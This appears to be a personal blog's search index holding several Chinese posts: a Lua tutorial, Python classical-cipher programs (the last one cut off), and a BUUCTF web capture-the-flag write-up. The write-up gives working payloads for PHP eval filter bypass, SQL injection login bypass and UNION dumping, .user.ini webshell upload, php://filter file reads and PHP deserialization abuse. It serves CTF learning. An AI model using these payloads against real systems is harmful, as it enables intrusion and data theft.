<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>lua基本语法</title>
    <link href="/newblog/2020/07/28/lua%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/"/>
    <url>/newblog/2020/07/28/lua%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p><code>sudo apt-get install lua5.4</code></p><h2 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h2><h3 id="交互式"><a href="#交互式" class="headerlink" title="交互式"></a>交互式</h3><p><code>lua -i</code>进入交互式编程</p><pre><code>chenxiyuan@kali:~$ lua -iLua 5.4.0  Copyright (C) 1994-2020 Lua.org, PUC-Rio&gt; print(&quot;hello world!&quot;)hello world!</code></pre><h3 id="脚本式"><a href="#脚本式" class="headerlink" title="脚本式"></a>脚本式</h3><pre><code>chenxiyuan@kali:~$ cat &lt;&lt; EOF &gt; 1.lua&gt; print(&quot;hello world!&quot;)&gt; EOFchenxiyuan@kali:~$ lua 1.luahello world!</code></pre><h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p><code>--</code>是单行注释;<br><code>--[[]]--</code>是多行注释.</p><h3 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h3><p><code>and</code>,<code>break</code>,<code>do</code>,<code>else</code>,,<code>elseif</code>,<code>end</code>,<code>false</code>,<code>for</code>,<code>function</code>,<code>if</code>,<code>in</code>,<code>local</code>,<code>nil</code>,<code>not</code>,<code>or</code>,<code>repeat</code>,<code>return</code>,<code>then</code>,<code>true</code>,<code>until</code>,<code>while</code>    ,<code>goto</code></p><h3 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h3><p>变量默认是全局的，并且就算你没有进行创建并直接访问也不会报错，得到的返回值是<code>nil</code>即为空。也就是说当变量值不为<code>nil</code>才表示存在.</p><pre><code>&gt; print(a)nil&gt; a=100&gt; print(a)100&gt;</code></pre><p>删除一个变量,把赋值为空即可.</p><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p><code>nil</code>:这个最简单，只有值nil属于该类，表示一个无效值（在条件表达式中相当于false）。<br><code>boolean</code>:包含两个值：false和true。<br><code>number</code>:表示双精度类型的实浮点数。<br><code>string</code>:字符串由一对双引号或单引号来表示。<br><code>function</code>:由C或Lua编写的函数。<br><code>userdata</code>:表示任意存储在变量中的C数据结构。<br><code>thread</code>:表示执行的独立线路，用于执行协同程序。<br><code>table</code>:Lua 中的表（table）其实是一个”关联数组”（associative arrays），数组的索引可以是数字、字符串或表类型。在 Lua 里，table 的创建是通过”构造表达式”来完成，最简单构造表达式是{}，用来创建一个空表。</p><h3 id="nil"><a href="#nil" class="headerlink" title="nil"></a>nil</h3><p><code>nil</code>:空值</p><pre><code class="lua">&gt; print(type(x))nil</code></pre><h3 id="boolean"><a href="#boolean" class="headerlink" title="boolean"></a>boolean</h3><p><code>boolean</code>:布尔值，true和false,nil等同false，其他都视为true，0也是true</p><pre><code>&gt; if 0 then&gt;&gt; print(&quot;0 is true&quot;)&gt;&gt; else&gt;&gt; print(&quot;0 is false&quot;)&gt;&gt; end0 is true</code></pre><h3 id="number"><a href="#number" class="headerlink" title="number"></a>number</h3><p><code>number</code>:数字默认双精度double型</p><h3 id="string"><a href="#string" class="headerlink" title="string"></a>string</h3><p><code>string</code>:字符串，双引号或单引号来表示，<code>[[]]</code>表示换行文本，<code>..</code>可以拼接字符串</p><pre><code>&gt; a=[[c&gt;&gt; a&gt;&gt; t]]&gt; print(a)cat&gt; print(&quot;a&quot;..&quot;b&quot;)ab&gt; print(125 .. 555)125555</code></pre><h3 id="table"><a href="#table" class="headerlink" title="table"></a>table</h3><p><code>table</code>:表,用<code>{}</code>来构造,是一个关联数组，如果没有key，默认从1开始索引。</p><pre><code>&gt; table1 = {&quot;a&quot;,&quot;b&quot;,&quot;c&quot;}&gt; print(table1[1])a</code></pre><p>table有以下几个方法</p><pre><code>table.insert（数组，键，值）table.remove(数组名，键)table.sort(数组，排序规则</code></pre><h3 id="function"><a href="#function" class="headerlink" title="function"></a>function</h3><p><code>function</code>:函数</p><pre><code>&gt; function a()&gt;&gt; print(&quot;abc&quot;)&gt;&gt; end&gt; a()abc</code></pre><h3 id="thread"><a href="#thread" class="headerlink" title="thread"></a>thread</h3><p><code>thread</code>:线程。在 Lua 里，最主要的线程是协同程序（coroutine）。它跟线程（thread）差不多，拥有自己独立的栈、局部变量和指令指针，可以跟其他协同程序共享全局变量和其他大部分东西。<br>线程跟协程的区别：线程可以同时多个运行，而协程任意时刻只能运行一个，并且处于运行状态的协程只有被挂起（suspend）时才会暂停。</p><h3 id="userdata"><a href="#userdata" class="headerlink" title="userdata"></a>userdata</h3><p><code>userdata</code>:自定义类型。userdata 是一种用户自定义数据，用于表示一种由应用程序或 C/C++ 语言库所创建的类型，可以将任意 C/C++ 的任意数据类型的数据（通常是 struct 和 指针）存储到 Lua 变量中调用。</p>]]></content>
    
    
    <categories>
      
      <category>其他</category>
      
    </categories>
    
    
    <tags>
      
      <tag>lua</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF web writeup(三)</title>
    <link href="/newblog/2020/04/12/BUUCTF-web-writeup-%E4%B8%89/"/>
    <url>/newblog/2020/04/12/BUUCTF-web-writeup-%E4%B8%89/</url>
    
    <content type="html"><![CDATA[<h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p>题目是一个计算器，F12看到上了waf，去看看calc.php内容</p><pre><code class="php">&lt;?phperror_reporting(0);if(!isset($_GET[&#39;num&#39;])){    show_source(__FILE__);}else{        $str = $_GET[&#39;num&#39;];        $blacklist = [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;`&#39;, &#39;\[&#39;, &#39;\]&#39;,&#39;\$&#39;,&#39;\\&#39;,&#39;\^&#39;];        foreach ($blacklist as $blackitem) {                if (preg_match(&#39;/&#39; . $blackitem . &#39;/m&#39;, $str)) {                        die(&quot;what are you want to do?&quot;);                }        }        eval(&#39;echo &#39;.$str.&#39;;&#39;);}?&gt;</code></pre><p>知识点:当php进行解析的时候，如果变量前面有空格，会去掉前面的空格再解析，那么我们就可以利用这个特点绕过waf。因为waf只是限制了<code>num</code>，分辨不出<code>num</code></p><pre><code>用chr转化成ascll码进行绕过payload:calc.php?%20num=1;var_dump(scandir(chr(47)));1array(24) { [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(10) &quot;.dockerenv&quot; [3]=&gt; string(3) &quot;bin&quot; [4]=&gt; string(4) &quot;boot&quot; [5]=&gt; string(3) &quot;dev&quot; [6]=&gt; string(3) &quot;etc&quot; [7]=&gt; string(5) &quot;f1agg&quot; [8]=&gt; string(4) &quot;home&quot; [9]=&gt; string(3) &quot;lib&quot; [10]=&gt; string(5) &quot;lib64&quot; [11]=&gt; string(5) &quot;media&quot; [12]=&gt; string(3) &quot;mnt&quot; [13]=&gt; string(3) &quot;opt&quot; [14]=&gt; string(4) &quot;proc&quot; [15]=&gt; string(4) &quot;root&quot; [16]=&gt; string(3) &quot;run&quot; [17]=&gt; string(4) &quot;sbin&quot; [18]=&gt; string(3) &quot;srv&quot; [19]=&gt; string(8) &quot;start.sh&quot; [20]=&gt; string(3) &quot;sys&quot; [21]=&gt; string(3) &quot;tmp&quot; [22]=&gt; string(3) &quot;usr&quot; [23]=&gt; string(3) &quot;var&quot; }payload:calc.php?%20num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)));</code></pre><h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><p>简单，一个sql注入万能密码。</p><pre><code>payload:username=admin+%27+--%2B&amp;password=%27123</code></pre><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>通过看大佬的wp学到了<code>.user.ini</code>的用法。<code>.user.ini</code>实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式为“PHP_INI_PERDIR 、 PHP_INI_USER”的设置。<br>利用<code>auto_prepend_file</code>指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。这样就可以加载后门了。<br>上传的图片类型检测，可以通过hex填图片类型的头通过。<code>&lt;?</code>在黑名单里，可以通过javascript调用php执行。<br><img src="http://120.26.91.51:4001/uploads/big/29a0cb283867fe7248eec659d66e1ab1.png" srcset="/newblog/img/loading.gif" alt="图片"></p><pre><code>payload:/uploads/48cd8b43081896fbd0931d204f947663/index.php?cxy=var_dump(scandir(&quot;/&quot;));/uploads/48cd8b43081896fbd0931d204f947663/index.php?cxy=var_dump(file_get_contents(&quot;/flag&quot;));</code></pre><h2 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h2><p>打开F12看到Archive_room.php，访问后点击secret发现查阅结束，打开burp拦截可以看到secr3t.php，访问得到</p><pre><code>&lt;html&gt;    &lt;title&gt;secret&lt;/title&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;&lt;?php    highlight_file(__FILE__);    error_reporting(0);    $file=$_GET[&#39;file&#39;];    if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;)){        echo &quot;Oh no!&quot;;        exit();    }    include($file); //flag放在了flag.php里?&gt;&lt;/html&gt;</code></pre><p>明显的文件包含+php伪协议。构造payload</p><pre><code>secr3t.php?file=php://filter/read=convert.base64-encode/resource=flag.php</code></pre><p>base64解码后得到源码，里面有flag。</p><h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><p>打开提示有备份网站的习惯，直接访问<a href="http://www.zip成功下载到备份。查看源码发现是一道php反序列化的题" target="_blank" rel="noopener">www.zip成功下载到备份。查看源码发现是一道php反序列化的题</a></p><pre><code class="php">&lt;?phpinclude &#39;flag.php&#39;;error_reporting(0);class Name{    private $username = &#39;nonono&#39;;    private $password = &#39;yesyes&#39;;    public function __construct($username,$password){        $this-&gt;username = $username;        $this-&gt;password = $password;    }    function __wakeup(){        $this-&gt;username = &#39;guest&#39;;    }    function __destruct(){        if ($this-&gt;password != 100) {            echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;            echo &quot;You name is: &quot;;            echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;            echo &quot;You password is: &quot;;            echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;            die();        }        if ($this-&gt;username === &#39;admin&#39;) {            global $flag;            echo $flag;        }else{            echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#39;t give you the flag!&quot;;            die();        }    }}?&gt;</code></pre><p>通过<code>__destruct</code>来<code>echo $flag</code>,满足条件两个条件就行。</p><pre><code>$a = new Name(&#39;admin&#39;,100);$b=serialize($a);echo $b;</code></pre><p>serialize() 函数会检查类中是否存在一个魔术方法<code>__sleep()</code>。如果存在，该方法会先被调用，然后才执行序列化操作。与之相反，unserialize() 会检查是否存在一个<code>__wakeup()</code>方法。如果存在，则会先调用<code>__wakeup</code>方法，预先准备对象需要的资源。<br>所以这里需要修改Object后的数字来绕过魔术方法，也是一个比较常见的知识点。</p><pre><code>O:4:&quot;Name&quot;:2:{s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;}</code></pre><p>修改为</p><pre><code>O:4:&quot;Name&quot;:3:{s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;}</code></pre><p>这里的%00是因为私有变量序列化后会产生\x00，复制以后就丢失了，在浏览器上自己补充上%00.</p><pre><code>payload:index.php?select=O:4:&quot;Name&quot;:3:{s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;}</code></pre><h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><p>联合注入，测试字段，发现是3个，有回显，直接爆库爆表爆列查询。payload:</p><pre><code>http://fb22b7cd-389b-40ea-913f-020616bf3b1b.node3.buuoj.cn/check.php?username=1%27%20union%20select%201,2,group_concat(table_name) from information_schema.tables where table_schema=database() %23&amp;password=1http://fb22b7cd-389b-40ea-913f-020616bf3b1b.node3.buuoj.cn/check.php?username=1%27%20union%20select%201,2,group_concat(column_name) from information_schema.columns where table_name=&#39;l0ve1ysq1&#39; %23&amp;password=1http://fb22b7cd-389b-40ea-913f-020616bf3b1b.node3.buuoj.cn/check.php?username=1%27%20union%20select%201,2,group_concat(password) from l0ve1ysq1 %23&amp;password=1</code></pre>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python实现转轮密码机</title>
    <link href="/newblog/2020/04/06/python%E5%AE%9E%E7%8E%B0%E8%BD%AC%E8%BD%AE%E5%AF%86%E7%A0%81%E6%9C%BA/"/>
    <url>/newblog/2020/04/06/python%E5%AE%9E%E7%8E%B0%E8%BD%AC%E8%BD%AE%E5%AF%86%E7%A0%81%E6%9C%BA/</url>
    
    <content type="html"><![CDATA[<p>密码学第一个实验。<br>三转轮密码机，慢轮中轮快轮，每加密一个字符，快轮转动一圈，快轮每转动26圈中轮转动一圈，中轮每转动26圈慢轮转动一圈。<br>因此三转轮密码机的密钥空间为<code>26*26*26=17576</code><br><img src="http://120.26.91.51:4001/uploads/big/6fc515e9f24d80321f00c0ee130ccf7f.png" srcset="/newblog/img/loading.gif" alt="转轮机恢复初始状态"><br>代码:</p><pre><code class="python">from tkinter import *import tkinter as tkimport tkinter.messageboxwindow =tk.Tk() #实例化objectwindow.title(&#39;转轮密码机&#39;) #窗口标题window.geometry(&#39;1000x400&#39;) #窗口尺寸a=[&#39;A&#39;,&#39;B&#39;,&#39;C&#39;,&#39;D&#39;,&#39;E&#39;,&#39;F&#39;,&#39;G&#39;,&#39;H&#39;,&#39;I&#39;,&#39;J&#39;,&#39;K&#39;,&#39;L&#39;,&#39;M&#39;,&#39;N&#39;,&#39;O&#39;,&#39;P&#39;,&#39;Q&#39;,&#39;R&#39;,&#39;S&#39;,&#39;T&#39;,&#39;U&#39;,&#39;V&#39;,&#39;W&#39;,&#39;X&#39;,&#39;Y&#39;,&#39;Z&#39;]def TurnWheel(wheel_l,wheel_r):    temp_l=wheel_l[-1]    wheel_l.pop()#移除尾元素    wheel_l.insert(0,temp_l)    temp_r=wheel_r[-1]    wheel_r.pop()#移除尾元素    wheel_r.insert(0,temp_r)def ReverseWheel(wheel_l,wheel_r):    temp_l=wheel_l[0]    wheel_l.pop(0)#移除首元素    wheel_l.append(temp_l)    temp_r=wheel_r[0]    wheel_r.pop(0)#移除首元素    wheel_r.append(temp_r)def encrypt():    if text1.get(1.0, END) == &#39;\n&#39;:#获取原文文本框内容        tkinter.messagebox.showinfo(&#39;提示&#39;, &#39;请输入原文&#39;)    else:        slow_l=[24,25,26,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23]        slow_r=[21,3,15,1,19,10,14,26,20,8,16,7,22,4,11,5,17,9,12,23,18,2,25,6,24,13]        middle_l=[26,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25]        middle_r=[20,1,6,4,15,3,14,12,23,5,16,2,22,19,11,18,25,24,13,7,10,8,21,9,26,17]        fast_l=[1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26]        fast_r=[8,18,26,17,20,22,10,3,13,11,4,23,5,24,9,12,25,16,19,6,15,21,2,7,1,14]        Plaintext=text1.get(1.0,END).strip()#删除最后一位\n元素        cipher=&#39;&#39;        count=0        for element in Plaintext :            cipher+=a[fast_r.index(fast_l[middle_r.index(middle_l[slow_r.index(slow_l[a.index(element)])])])]            count+=1            TurnWheel(fast_l,fast_r)            if(count%26==0):                TurnWheel(middle_l,middle_r)                if(count%(26*26)==0):                    TurnWheel(slow_l,slow_r)    text2.delete(1.0, END)    text2.insert(1.0, cipher)def decrypt():    if text2.get(1.0,END) == &#39;\n&#39;: #获取密文文本框内容        tkinter.messagebox.showinfo(&#39;提示&#39;, &#39;请输入密文&#39;)    else:        Ciphertext=text2.get(1.0,END).strip()        plain=&#39;&#39;        slow_l=[24,25,26,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23]        slow_r=[21,3,15,1,19,10,14,26,20,8,16,7,22,4,11,5,17,9,12,23,18,2,25,6,24,13]        middle_l=[26,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25]        middle_r=[20,1,6,4,15,3,14,12,23,5,16,2,22,19,11,18,25,24,13,7,10,8,21,9,26,17]        fast_l=[1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26]        fast_r=[8,18,26,17,20,22,10,3,13,11,4,23,5,24,9,12,25,16,19,6,15,21,2,7,1,14]        count=0        for element in Ciphertext:#先把转轮机转到加密后的状态                                   count+=1            TurnWheel(fast_l,fast_r)            if(count%26==0):                TurnWheel(middle_l,middle_r)                if(count%(26*26)==0):                    TurnWheel(slow_l,slow_r)                    for element in Ciphertext[::-1]:            ReverseWheel(fast_l,fast_r)                       plain+=a[slow_l.index(slow_r[middle_l.index(middle_r[fast_l.index(fast_r[a.index(element)])])])]            if(count%26==0):                TurnWheel(middle_l,middle_r)                if(count%(26*26)==0):                    TurnWheel(slow_l,slow_r)             count-=1                               text1.delete(1.0, END)    text1.insert(1.0, plain[::-1])if __name__==&#39;__main__&#39;:    labe1 = tk.Label(window, text=&#39;原文:&#39;, font=(&#39;宋体&#39;, 12), width=20, height=2)    labe2 = tk.Label(window, text=&#39;密文:&#39;, font=(&#39;宋体&#39;, 12), width=20, height=2)    labe3 = tk.Label(window, text=&#39;请输入大写字母，原文经过加密后输出在密文框，转轮机恢复初始状态.解密时先从初始状态转到加密后状态，再进行解密&#39;, bg=&#39;green&#39;, font=(&#39;宋体&#39;, 12), width=100, height=4)    text1 = tk.Text(window, show=None, font=(&#39;Arial&#39;, 10))    text2 = tk.Text(window, show=None, font=(&#39;Arial&#39;, 10))    button1 = tk.Button(window, text=&#39;加密&#39;, font=(&#39;宋体&#39;, 12,), width=5, height=1, command=encrypt)    button2 = tk.Button(window, text=&#39;解密&#39;, font=(&#39;宋体&#39;, 12,), width=5, height=1, command=decrypt)    text1.place(relx=0.2,rely=0.3,relwidth=0.6,relheight=0.2)    text2.place(relx=0.2,rely=0.7,relwidth=0.6,relheight=0.2)    labe1.place(relx=0,rely=0.35,relwidth=0.3)    labe2.place(relx=0,rely=0.75,relwidth=0.3)    labe3.place(relx=0,rely=0,relwidth=1)    button1.place(relx=0.3,rely=0.9)    button2.place(relx=0.6,rely=0.9)    window.mainloop() </code></pre>]]></content>
    
    
    <categories>
      
      <category>crypto</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>混合密码算法的模拟实现</title>
    <link href="/newblog/2020/03/23/%E6%B7%B7%E5%90%88%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95%E7%9A%84%E6%A8%A1%E6%8B%9F%E5%AE%9E%E7%8E%B0/"/>
    <url>/newblog/2020/03/23/%E6%B7%B7%E5%90%88%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95%E7%9A%84%E6%A8%A1%E6%8B%9F%E5%AE%9E%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<p>这个是大二上的程序设计周选择的题目，半年前写的。没办法，硬盘坏了只能现在发出来。<br>用了tkinter库</p><pre><code class="python">from tkinter import *import tkinter as tkimport tkinter.filedialogimport tkinter.messageboximport tkinter.simpledialogwindow =tk.Tk() #实例化objectwindow.title(&#39;混合密码算法的模拟实现&#39;) #窗口标题window.geometry(&#39;800x400&#39;) #窗口尺寸def encrypt():#加密，首先判断原文是否为空，不为空根据radiobutton的值进行对应的加密    if text1.get(1.0, END) == &#39;\n&#39;:#获取原文文本框内容        tkinter.messagebox.showinfo(&#39;提示&#39;, &#39;请输入原文&#39;)    else:        if var.get() ==&#39;A&#39;:            kaisa_encrypt(text1.get(1.0,END))        if var.get() ==&#39;B&#39;:            affine_encrypt(text1.get(1.0,END))        if var.get()== &#39;C&#39;:            swift_encrypt(text1.get(1.0,END))        if var.get()==&#39;D&#39;:            cycle_encrypt(text1.get(1.0,END))        if var.get()==&#39;E&#39;:            swift_encrypt(kaisa_encrypt(text1.get(1.0, END)))        if var.get()==&#39;F&#39;:            swift_encrypt(affine_encrypt(text1.get(1.0,END)))        if var.get()==&#39;G&#39;:            cycle_encrypt(kaisa_encrypt(text1.get(1.0, END)))        if var.get()==&#39;H&#39;:            cycle_encrypt(affine_encrypt(text1.get(1.0,END)))def decrypt():#解密，首先判断密文是否为空，不为空根据radiobutton的值进行对应的解密    if text2.get(1.0,END) == &#39;\n&#39;: #获取密文文本框内容        tkinter.messagebox.showinfo(&#39;提示&#39;, &#39;请输入密文&#39;)    else:        if var.get() == &#39;A&#39;:            kaisa_decrypt(text2.get(1.0,END))        if var.get() == &#39;B&#39;:            affine_decrypt(text2.get(1.0, END))        if var.get() == &#39;C&#39;:            swift_decrypt(text2.get(1.0, END))        if var.get()==&#39;D&#39;:            cycle_decrypt(text2.get(1.0,END))        if var.get()==&#39;E&#39;:            kaisa_decrypt(swift_decrypt(text2.get(1.0, END)))        if var.get()==&#39;F&#39;:            affine_decrypt(swift_decrypt(text2.get(1.0, END)))        if var.get()==&#39;G&#39;:            kaisa_decrypt(cycle_decrypt(text2.get(1.0,END)))        if var.get()==&#39;H&#39;:            affine_decrypt(cycle_decrypt(text2.get(1.0,END)))def file_import():#原文导入功能    filename = tk.filedialog.askopenfilename()    if filename != &#39;&#39;:        with open(filename, &#39;r&#39;) as f:            text1.delete(1.0, END)            text1.insert(1.0, f.read())    else:        tkinter.messagebox.showinfo(&#39;提示&#39;, &#39;未选择文件&#39;)def file_save():#原文导出功能    if text1.get(1.0,END) == &#39;\n&#39;:        tkinter.messagebox.showinfo(&#39;提示&#39;, &#39;原文为空&#39;)    else:        filename = tkinter.filedialog.asksaveasfilename(title=u&#39;保存文件&#39;, filetypes=[(&quot;TXT&quot;, &quot;.txt&quot;)])        with open(filename, &#39;a&#39;) as f:            f.write(text1.get(1.0, END))def cipher_import():#密文导入功能    filename = tk.filedialog.askopenfilename()    if filename != &#39;&#39;:        with open(filename, &#39;r&#39;) as f:            text2.delete(1.0, END)            text2.insert(1.0, f.read())    else:        tkinter.messagebox.showinfo(&#39;提示&#39;, &#39;未选择文件&#39;)def cipher_save():#密文导出功能    if text2.get(1.0,END) == &#39;\n&#39;:        tkinter.messagebox.showinfo(&#39;提示&#39;, &#39;密文为空&#39;)    else:        filename = tkinter.filedialog.asksaveasfilename(title=u&#39;保存文件&#39;, filetypes=[(&quot;TXT&quot;, &quot;.txt&quot;)])        with open(filename, &#39;a&#39;) as f:            f.write(text2.get(1.0, END))def kaisa_encrypt(str):    k=int(tk.simpledialog.askstring(&quot;提示&quot;, &quot;请输入偏移量(1-25):&quot;,initialvalue=&#39;3&#39;))#变量k保存用户输入的偏移量值    cipher=[]#列表储存密文    for i in range(len(str)):        if str[i].islower():            if ord(str[i]) &lt; 123 - k:                c = chr(ord(str[i]) + k)                cipher.append(c)            else:                c = chr(ord(str[i]) + k - 26)                cipher.append(c)        elif str[i].isupper():            if ord(str[i]) &lt; 91 - k:                c = chr(ord(str[i]) + k)                cipher.append(c)            else:                c = chr(ord(str[i]) + k - 26)                cipher.append(c)        else:            c = str[i]            cipher.append(c)    cipherstr = &#39;&#39;.join(cipher)    text2.delete(1.0, END)    text2.insert(1.0, cipherstr)    return cipherstrdef kaisa_decrypt(str):    k = int(tk.simpledialog.askstring(&quot;提示&quot;, &quot;请输入偏移量(1-25):&quot;, initialvalue=&#39;3&#39;))#变量k保存用户输入的偏移量值    cipher=[]    for i in range(len(str)):        if str[i].islower():            if ord(str[i]) &gt; 96 + k:                c = chr(ord(str[i]) - k)                cipher.append(c)            else:                c = chr(ord(str[i]) - k + 26)                cipher.append(c)        elif str[i].isupper():            if ord(str[i]) &gt; 64 +k:                c = chr(ord(str[i]) - k)                cipher.append(c)            else:                c = chr(ord(str[i]) - k + 26)                cipher.append(c)        else:            c = str[i]            cipher.append(c)    cipherstr = &#39;&#39;.join(cipher)    text1.delete(1.0, END)    text1.insert(1.0, cipherstr)def affine_encrypt(str):    x =tk.simpledialog.askstring(&quot;提示&quot;, &quot;请输入密钥a,b(gcd(a,b)=1&amp;&amp;gcd(a,26)=1):&quot;, initialvalue=&#39;5,8&#39;)    a=int(x[0:list(x).index(&#39;,&#39;)])    b=int(x[list(x).index(&#39;,&#39;)+1:])    t1=&#39;abcdefghijklmnopqrstuvwxyz&#39;    t2=&#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;    cipher=[]    for i in str:        if i in t1:            m=list(t1).index(i)            cipher.append(t1[(a*m+b)%26])        elif i in t2:            m = list(t2).index(i)            cipher.append(t2[(a* m + b) % 26])        else:            cipher.append(i)    cipherstr = &#39;&#39;.join(cipher)    text2.delete(1.0, END)    text2.insert(1.0, cipherstr)    return cipherstrdef inverse(m,n): #求逆元    m1 = m    n1 = n    r = m % n    q = []  # 从q1开始,到qn    yu = [r]    while (r != 0):        m = n        n = r        r = m % n        yu.append(r)        q.append(m // n)    q.pop()    s = [0, 1]    for i in range(len(q)):        s.append(-q[i] * s[i + 1] + s[i])    s1 = s.pop()    return s1def affine_decrypt(str):    x = tk.simpledialog.askstring(&quot;提示&quot;, &quot;请输入密钥a,b(gcd(a,b)=1&amp;&amp;gcd(a,26)=1):&quot;, initialvalue=&#39;5,8&#39;)    a = int(x[0:list(x).index(&#39;,&#39;)])    b = int(x[list(x).index(&#39;,&#39;) + 1:])    c=inverse(a,26)#c为a的逆元    t1=&#39;abcdefghijklmnopqrstuvwxyz&#39;    t2=&#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;    cipher=[]    for i in str:        if i in t1:            m=list(t1).index(i)            cipher.append(t1[int(((m-b)*c)%26)])        elif i in t2:            m = list(t2).index(i)            cipher.append(t2[int(((m-b)*c)% 26)])        else:            cipher.append(i)    cipherstr = &#39;&#39;.join(cipher)    text1.delete(1.0, END)    text1.insert(1.0, cipherstr)def swift_encrypt(str):    str=str[0:-1] #切片去除字符串最后默认有的换行    key=tk.simpledialog.askstring(&quot;提示&quot;, &quot;请输入密钥(默认为code):&quot;,initialvalue=&#39;code&#39;)    k=len(key)# 列数    str+=&#39; &#39;*(k-(len(str)%k))#用空格填充    list1=[] #用来获取列置换的规律,例如code表示1423    for i in key:        n=1        for j in key:            if i &gt; j:                n+=1        list1.append(n)    l=int((len(str)/k))#行数    cipher=[] #置换前的矩阵    for i in range(0,k):        cipher.append(&#39;&#39;.join([str[j] for j in range(0,len(str)) if j%k==i ]))    m=[] #保存置换后的矩阵    for i in list1:        m.append(cipher[i-1])    n=&#39;&#39; #保存置换后并按顺序排列    for i in range(0,l):        for j in range(0,k):            n+=m[j][i]    text2.delete(1.0, END)    text2.insert(1.0, n)def swift_decrypt(str):    str = str[0:-1]  # 切片去除字符串最后默认有的换行    key = tk.simpledialog.askstring(&quot;提示&quot;, &quot;请输入密钥(默认为code):&quot;, initialvalue=&#39;code&#39;)    k = len(key)  # 列数    list1 = []  # 用来获取列置换的规律    for i in key:        n = 1        for j in key:            if i &gt; j:                n += 1        list1.append(n)    l = int((len(str) / k))  # 行数    cipher = []  # 置换前的矩阵    for i in range(0, k):        cipher.append(&#39;&#39;.join([str[j] for j in range(0, len(str)) if j % k == i]))    m = []  # 保存置换后的矩阵    for i in range(1,k+1):        m.append(cipher[list1.index(i)])    n=&#39;&#39;    for i in range(0,l):        for j in range(0,k):            n+=m[j][i]    text1.delete(1.0, END)    text1.insert(1.0, n)    return ndef cycle_encrypt(str):    str = str[0:-1]  # 切片去除字符串最后默认有的换行    key = tk.simpledialog.askstring(&quot;提示&quot;, &quot;请输入密钥(默认为1324):&quot;, initialvalue=&#39;1324&#39;)    k = len(key)  # 列数    str += &#39; &#39; * (k - (len(str) % k))  # 用空格填充    l = int((len(str) / k))  # 行数    cipher = []  # 置换前的矩阵    for i in range(0, k):        cipher.append(&#39;&#39;.join([str[j] for j in range(0, len(str)) if j % k == i]))    m = [&#39;&#39; for i in range(0,k)]# 保存置换后的矩阵    for i in range(0,k-1):        m[int(key[i+1])-1]=cipher[int(key[i])-1]    m[int(key[0])-1]=cipher[int(key[k-1])-1]    n = &#39;&#39;  # 保存置换后并按顺序排列    for i in range(0, l):        for j in range(0, k):            n += m[j][i]    text2.delete(1.0, END)    